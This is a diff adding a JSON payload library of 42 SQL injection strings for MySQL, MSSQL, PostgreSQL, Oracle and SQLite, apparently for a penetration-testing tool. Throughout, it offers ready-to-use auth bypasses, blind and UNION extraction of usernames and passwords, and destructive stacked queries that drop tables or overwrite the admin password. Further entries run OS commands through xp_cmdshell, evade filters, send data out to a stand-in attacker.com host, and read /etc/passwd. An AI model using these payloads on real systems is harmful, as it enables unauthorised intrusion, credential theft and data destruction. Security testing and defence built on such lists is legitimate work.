@@ -1,0 +1,61 @@
+{
+  "meta": {
+    "name": "SQL Injection",
+    "icon": "🗄️",
+    "description": "SQL injection payloads for MySQL, MSSQL, PostgreSQL, Oracle, and SQLite. Covers auth bypass, error-based, boolean/time blind, UNION, stacked queries, filter bypasses, and OOB exfiltration.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 42
+  },
+  "payloads": [
+    {"id":1,"code":"' OR '1'='1","description":"Classic single-quote tautology auth bypass","category":"auth-bypass","platform":["mysql","mssql","postgresql","oracle","sqlite"],"tags":["auth","classic","tautology"]},
+    {"id":2,"code":"' OR '1'='1'--","description":"Auth bypass with inline comment neutralizing rest of query","category":"auth-bypass","platform":["mysql","mssql","sqlite"],"tags":["auth","comment"]},
+    {"id":3,"code":"admin'--","description":"Username-only bypass — terminates password check via comment","category":"auth-bypass","platform":["mysql","mssql","sqlite"],"tags":["auth","comment"]},
+    {"id":4,"code":"' OR 1=1--","description":"Numeric tautology auth bypass with comment","category":"auth-bypass","platform":["mysql","mssql","postgresql","sqlite"],"tags":["auth","tautology"]},
+    {"id":5,"code":"') OR ('1'='1","description":"Bracket-adjusted auth bypass for queries with closing parens","category":"auth-bypass","platform":["mysql","mssql","postgresql"],"tags":["auth","bracket"]},
+
+    {"id":6,"code":"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","description":"MySQL EXTRACTVALUE error extraction — version leaks in XML parse error","category":"error-based","platform":["mysql"],"tags":["error","mysql","extractvalue"]},
+    {"id":7,"code":"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--","description":"MySQL UPDATEXML error extraction — DB user leaked in error","category":"error-based","platform":["mysql"],"tags":["error","mysql","updatexml"]},
+    {"id":8,"code":"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","description":"MySQL FLOOR+RAND GROUP BY duplicate-key error extraction","category":"error-based","platform":["mysql"],"tags":["error","mysql","floor","rand"]},
+    {"id":9,"code":"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--","description":"MSSQL CONVERT type error — leaks first table name","category":"error-based","platform":["mssql"],"tags":["error","mssql","convert"]},
+    {"id":10,"code":"' AND 1=CAST((SELECT version()) AS int)--","description":"PostgreSQL CAST type error — leaks version string in error","category":"error-based","platform":["postgresql"],"tags":["error","postgresql","cast"]},
+    {"id":11,"code":"' AND 1=(SELECT 1 FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--","description":"MySQL NAME_CONST duplicate-column error extraction","category":"error-based","platform":["mysql"],"tags":["error","mysql","name_const"]},
+
+    {"id":12,"code":"' AND 1=1--","description":"Boolean TRUE probe — baseline for blind injection detection","category":"boolean-blind","platform":["mysql","mssql","postgresql","sqlite"],"tags":["blind","boolean","probe"]},
+    {"id":13,"code":"' AND 1=2--","description":"Boolean FALSE probe — response difference confirms blind injection","category":"boolean-blind","platform":["mysql","mssql","postgresql","sqlite"],"tags":["blind","boolean","probe"]},
+    {"id":14,"code":"' AND SUBSTRING(username,1,1)='a'--","description":"Char-by-char extraction — tests first character of username field","category":"boolean-blind","platform":["mysql","mssql","postgresql"],"tags":["blind","boolean","substring","extraction"]},
+    {"id":15,"code":"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--","description":"ASCII binary search extraction on first password character","category":"boolean-blind","platform":["mysql"],"tags":["blind","boolean","ascii","extraction"]},
+    {"id":16,"code":"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--","description":"Probe information_schema access via boolean result","category":"boolean-blind","platform":["mysql","mssql","postgresql"],"tags":["blind","boolean","probe","information_schema"]},
+    {"id":17,"code":"' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--","description":"Blind extraction of admin password first character","category":"boolean-blind","platform":["mysql","postgresql","sqlite"],"tags":["blind","boolean","extraction"]},
+
+    {"id":18,"code":"' AND SLEEP(5)--","description":"MySQL time-based blind — 5 second delay via SLEEP()","category":"time-blind","platform":["mysql"],"tags":["blind","time","mysql","sleep"]},
+    {"id":19,"code":"'; IF(1=1) WAITFOR DELAY '0:0:5'--","description":"MSSQL time-based blind — 5s delay via WAITFOR DELAY","category":"time-blind","platform":["mssql"],"tags":["blind","time","mssql","waitfor"]},
+    {"id":20,"code":"'; SELECT pg_sleep(5)--","description":"PostgreSQL time-based blind via pg_sleep()","category":"time-blind","platform":["postgresql"],"tags":["blind","time","postgresql","pg_sleep"]},
+    {"id":21,"code":"' OR IF(1=1,SLEEP(5),0)--","description":"MySQL conditional SLEEP — delays only on true condition","category":"time-blind","platform":["mysql"],"tags":["blind","time","mysql","conditional"]},
+    {"id":22,"code":"' AND 1=(SELECT 1 FROM(SELECT SLEEP(5))a)--","description":"MySQL SLEEP in subquery — alternative syntax evading simple filters","category":"time-blind","platform":["mysql"],"tags":["blind","time","mysql","subquery"]},
+
+    {"id":23,"code":"' UNION SELECT NULL--","description":"UNION NULL column probe — increment NULLs until error disappears","category":"union-based","platform":["mysql","mssql","postgresql","sqlite"],"tags":["union","probe","null"]},
+    {"id":24,"code":"' UNION SELECT NULL,NULL--","description":"Two-column UNION probe","category":"union-based","platform":["mysql","mssql","postgresql","sqlite"],"tags":["union","probe","null"]},
+    {"id":25,"code":"' UNION SELECT NULL,NULL,NULL--","description":"Three-column UNION probe","category":"union-based","platform":["mysql","mssql","postgresql","sqlite"],"tags":["union","probe","null"]},
+    {"id":26,"code":"' UNION SELECT 'a',NULL,NULL--","description":"String column finder — replace NULLs with 'a' to find string columns","category":"union-based","platform":["mysql","mssql","postgresql"],"tags":["union","string-column"]},
+    {"id":27,"code":"' UNION SELECT username,password,NULL FROM users--","description":"Credential dump via UNION SELECT (3-column example)","category":"union-based","platform":["mysql","mssql","postgresql","sqlite"],"tags":["union","extraction","credentials"]},
+    {"id":28,"code":"' UNION SELECT table_name,NULL FROM information_schema.tables--","description":"Table enumeration via UNION + information_schema","category":"union-based","platform":["mysql","postgresql"],"tags":["union","enumeration","information_schema"]},
+    {"id":29,"code":"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--","description":"Column enumeration for users table via UNION","category":"union-based","platform":["mysql","postgresql"],"tags":["union","enumeration"]},
+
+    {"id":30,"code":"'; DROP TABLE users--","description":"Stacked DDL — drops users table (requires stacked query support)","category":"stacked","platform":["mssql","postgresql"],"tags":["stacked","ddl","destructive"]},
+    {"id":31,"code":"'; INSERT INTO users(username,password) VALUES('pwned','pwned')--","description":"Stacked INSERT — adds attacker-controlled user account","category":"stacked","platform":["mssql","postgresql"],"tags":["stacked","insert","privilege"]},
+    {"id":32,"code":"'; UPDATE users SET password='pwned' WHERE username='admin'--","description":"Stacked UPDATE — overwrites admin password","category":"stacked","platform":["mssql","postgresql"],"tags":["stacked","update","privilege"]},
+    {"id":33,"code":"'; EXEC xp_cmdshell('whoami')--","description":"MSSQL xp_cmdshell OS command execution (requires SA privileges)","category":"stacked","platform":["mssql"],"tags":["stacked","rce","xp_cmdshell"]},
+
+    {"id":34,"code":"' OR/**/1=1--","description":"Inline comment space bypass — /**/ replaces spaces to evade space filters","category":"filter-bypass","platform":["mysql","mssql","postgresql"],"tags":["bypass","comment","space"]},
+    {"id":35,"code":"' oR '1'='1","description":"Mixed-case bypass for case-sensitive keyword filters","category":"filter-bypass","platform":["mysql","mssql","postgresql","sqlite"],"tags":["bypass","case"]},
+    {"id":36,"code":"%27%20OR%20%271%27%3D%271","description":"URL-encoded payload — %27=' %20=space %3D== for WAF bypass","category":"filter-bypass","platform":["mysql","mssql","postgresql","sqlite"],"tags":["bypass","url-encoded"]},
+    {"id":37,"code":"' /*!UNION*/ /*!SELECT*/ NULL--","description":"MySQL versioned comment keyword bypass — executes inside /*!*/","category":"filter-bypass","platform":["mysql"],"tags":["bypass","versioned-comment","mysql"]},
+    {"id":38,"code":"'%09UNION%09SELECT%09NULL--","description":"Tab-character whitespace bypass (%09 = tab)","category":"filter-bypass","platform":["mysql","mssql","postgresql"],"tags":["bypass","tab","whitespace"]},
+    {"id":39,"code":"' UNION SELECT CHAR(117,115,101,114)--","description":"CHAR() encoding bypass — spells 'user' without string literals","category":"filter-bypass","platform":["mysql","mssql"],"tags":["bypass","char","encoding"]},
+
+    {"id":40,"code":"' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--","description":"MySQL OOB DNS exfil via LOAD_FILE UNC path (requires FILE privilege)","category":"oob","platform":["mysql"],"tags":["oob","dns","exfil","load_file"]},
+    {"id":41,"code":"'; EXEC master..xp_dirtree '//attacker.com/a'--","description":"MSSQL OOB DNS trigger via xp_dirtree UNC path traversal","category":"oob","platform":["mssql"],"tags":["oob","dns","mssql","xp_dirtree"]},
+    {"id":42,"code":"' AND 1=(SELECT LOAD_FILE('/etc/passwd'))--","description":"MySQL LOAD_FILE local file read via SQLi (requires FILE privilege)","category":"oob","platform":["mysql"],"tags":["oob","lfi","load_file"]}
+  ]
+}
